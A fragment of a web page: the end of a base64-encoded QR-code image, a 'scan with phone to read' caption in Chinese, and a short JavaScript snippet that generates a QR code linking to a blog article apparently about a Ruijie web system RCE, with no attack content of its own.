7T+AwEMj0IOh2nLKo3hHGOn3rOkLy6hBuHYTrq8v3qCfCWGtWX4Tk5CKMuvWiOXGlw7yPdRAfuD7tvX3Y1+HTXvd3Nm39jr1eH/IU6HeE+D0vX+UhdXBEa2D0ui7v+OPHj/v/GYE6PO8Dow/h1r+Ch7+yXim6Mv/uBLbPsnwSxdUtuw/jU9D93geSh6B50Xzn6qL+DM2IZuRi1+WQvUHQvNhzXdcX9UVI35l/vUI8pQ/B7T0EMjV4Dfv+IXUrffY0VBZSB8HSasFzXplakBxQdFjeExj+Oy0IN2xuxdU79jp9GPuri9bBMXe9QjylD8FtIE7tDPu+e14fjtMvr+c7r0wtdUgfeXn7pV6412fXkF4zrzSID8HSasHIS3u2ai+1nmVW3jaQVeDSv/cEDgOBPA0w4tm2YMzXE1LLOhh9GLk5EeKfcUgOHriqUa991ZKLpe3XSofcS1+E6DCi/it4GMgrRVfm353AHw8E8jT4ZLlVmOv6Pa8O87qel8/QXnorri5C7i23HqJDsOvyXrfSe05e+McDqSbX+nsn8M8HAuNT5VMDo+63pC/vqA+p735xM3W9XzCvgejWQbi16qK6CMnrQzgEza3QusJ/PpDVJi59fgKHgdSUZmtefrt/Glp5yNNQ1/u1qus6pB5GNAev6YAl99/O4fFvEjWAzQOUN3T/wDQH0c2JMNf1vQEkJ9/jYSB787r+/hPYBgKZGjzH1RZXT4E6pK/1XZd37Hn9lV4+jPeC8PJqWSuWVguSg6C+CM/16lFrlYexHsLhgdtAbHLhe0/gGsh7z/9w9/8BAAD//08aiS4AAAAGSURBVAMA8g8ZywbnQF8AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-system\_pi-timeout-patchsyslog-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 